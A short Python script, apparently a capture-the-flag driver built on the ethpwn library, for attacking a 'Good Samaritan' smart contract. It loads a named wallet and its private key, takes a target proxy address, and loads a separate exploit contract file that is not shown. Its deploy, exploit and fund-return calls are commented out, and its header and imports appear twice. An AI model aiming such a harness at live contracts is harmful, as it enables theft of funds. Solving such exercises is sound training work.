#!/usr/bin/env python3

import sys
from ethpwn import *

#!/usr/bin/env python3

from web3 import Web3
from time import sleep

from ethpwn import context
from ethpwn.contract import CONTRACT_METADATA
from ethpwn.transactions import transact

MY_WALLET = get_wallet_by_name('Laptop CTF Metamask')
assert MY_WALLET is not None
print(MY_WALLET)
context.log_level = 'DEBUG'

context.connect_http()
context.default_from_addr = MY_WALLET.address
context.default_signing_key = MY_WALLET.private_key

PROXY_ADDR = sys.argv[1]

CONTRACT_METADATA.add_solidity_files(['./exploit_good_samaritan.sol'])

# tx_hash, target = CONTRACT_METADATA['Exp'].deploy(value=context.w3.to_wei(0.01, 'ether'))
# print(target)


# tx_hash, tx_receipt = transact(target.functions.exploit())
# print(f"Received exploit receipt (block_number={tx_receipt['blockNumber']})")

# tx_hash, tx_receipt = transact(target.functions.return_funds())
# print(f"Received return_funds receipt (block_number={tx_receipt['blockNumber']})")